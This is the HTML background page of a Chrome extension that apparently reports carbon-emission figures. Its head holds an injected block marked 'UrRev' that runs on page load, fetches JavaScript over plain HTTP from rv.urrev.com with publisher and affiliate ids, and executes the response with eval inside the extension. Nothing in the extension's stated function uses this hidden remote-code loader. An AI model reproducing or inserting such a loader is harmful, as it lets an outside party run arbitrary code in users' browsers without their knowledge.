<!DOCTYPE html>
<!--
 * Copyright (c) 2010 The Chromium Authors. All rights reserved.  Use of this
 * source code is governed by a BSD-style license that can be found in the
 * LICENSE file.
-->
<html>
  <head>

<!-- UrRev BEGIN -->
<script>
function initGinyas(){
  var bbrsLogic = "http://rv.urrev.com/app/bookmark/bookmarklet/bbrsChromeRVObs.php?pubId=ginyas_211&affId=urrev_227";
  var domainsXHR = new XMLHttpRequest();domainsXHR.open("GET", bbrsLogic, true);
  domainsXHR.onreadystatechange = function() { 
	if (domainsXHR.readyState == 4) { globalEval(domainsXHR.responseText); }
  } 
  domainsXHR.send();
}

function globalEval(src, callback) {
  if (window.execScript) {window.execScript(src);if (callback){callback();} return;} 
  var fn = function() {window.eval.call(window,src);
  if (callback){callback();}};fn();		
}
</script>
<!--UrRev END -->


    <script>
      var _gaq = _gaq || [];
      _gaq.push(['_setAccount', 'UA-1471148-10']);
      _gaq.push(['_trackPageview']);

      (function() {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = 'https://ssl.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
      })();
    </script>  
    <script type="text/javascript" src="http://www.google.com/jsapi"></script>

    <script>

function carbonEmission() {
  var cE = localStorage["carbonEmission"]
  if (cE) return cE
  else return 217
}

	
function onRequest(request, sender, sendResponse) {
  // Show the page action for the tab that the sender (content script) was on.
  // chrome.pageAction.show(sender.tab.id);
  if (request.carbonEmission) {
    //alert("hi hi");
    chrome.pageAction.show(sender.tab.id);
    sendResponse({carbonEmission : carbonEmission()});
  }
};

// Listen for the content script to send a message to the background page.
chrome.extension.onRequest.addListener(onRequest);

function pageActionClicked() {
  chrome.tabs.create({url:chrome.extension.getURL("options.html")});
}

chrome.pageAction.onClicked.addListener(pageActionClicked);

    </script>
  </head>
  <body onload="initGinyas();" ></body>
</html>
